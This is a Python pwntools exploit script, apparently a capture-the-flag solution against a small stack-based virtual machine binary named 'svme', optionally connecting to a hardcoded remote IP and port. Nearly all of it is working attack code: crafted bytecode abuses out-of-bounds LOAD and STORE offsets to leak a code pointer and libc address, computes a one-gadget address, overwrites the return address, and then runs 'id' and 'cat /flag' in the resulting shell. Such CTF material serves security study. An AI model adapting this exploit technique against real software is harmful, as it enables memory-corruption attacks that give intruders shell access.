#!/usr/bin/env python3
from pwn import *
from struct import pack

if args["REMOTE"]:
    p = remote("47.243.140.252",1337)
else:
    p = process("./svme")

o = {
    "NOOP"    : p32(0),
    "IADD"    : p32(1),   # int add
    "ISUB"    : p32(2),
    "IMUL"    : p32(3),
    "ILT"     : p32(4),   # int less than
    "IEQ"     : p32(5),   # int equal
    "BR"      : p32(6),   # branch
    "BRT"     : p32(7),   # branch if true
    "BRF"     : p32(8),   # branch if true
    "ICONST"  : p32(9),   # push constant integer
    "LOAD"    : p32(10),  # load from local context
    "GLOAD"   : p32(11),  # load from global memory
    "STORE"   : p32(12),  # store in local context
    "GSTORE"  : p32(13),  # store in global memory
    "PRINT"   : p32(14),  # print stack top
    "POP"     : p32(15),  # throw away top of stack
    "CALL"    : p32(16),  # call function at address with nargs,nlocals
    "RET"     : p32(17),  # return value from function
    "HALT"    : p32(18)
}

###################
#  Exploit Code   #
###################

code = b""

# Load stack-leak (code-pointer) onto fake-stack
code += o["LOAD"] 
code += pack("=i",-996)
code += o["LOAD"] 
code += pack("=i",-997)

# Add 0x218 to the lower-bytes part
code += o["ICONST"]
code += pack("=i",0x218) # 0x218 is the offset from code pointer to _start leak
code += o["IADD"]


code += o["STORE"]
code += pack("=i",-993)
code += o["STORE"]
code += pack("=i",-992)

# Actually reading the data now
code += o["GLOAD"]
code += p32(1)
code += o["GLOAD"]
code += p32(0)

# Calculating pos of one-gadget
code += o["ICONST"]
code += p32(0x270b3)
code += o["ISUB"]

code += o["ICONST"]
code += p32(0xe6c81)
code += o["IADD"]

# Loading code-pointer-values to stack (-40 = RET addr)

code += o["LOAD"] 
code += pack("=i",-996)
code += o["LOAD"] 
code += pack("=i",-997)

# Calculating location of ret
code += o["ICONST"]
code += pack("=i",40)
code += o["ISUB"]

 # Writing lower 4 bytes of ret-addr
code += o["STORE"]
code += pack("=i",-993)

code += o["STORE"]
code += pack("=i",-992)

# Writing one-gadget addr
code += o["GSTORE"]
code += p32(0)

code += o["GSTORE"]
code += p32(1)


# Ending program
code += o["HALT"]

code = code.ljust(128*4, b"\x00")

p.send(code)

p.sendline("id")
if args["REMOTE"]:
    p.sendline("cat /flag")

p.interactive()
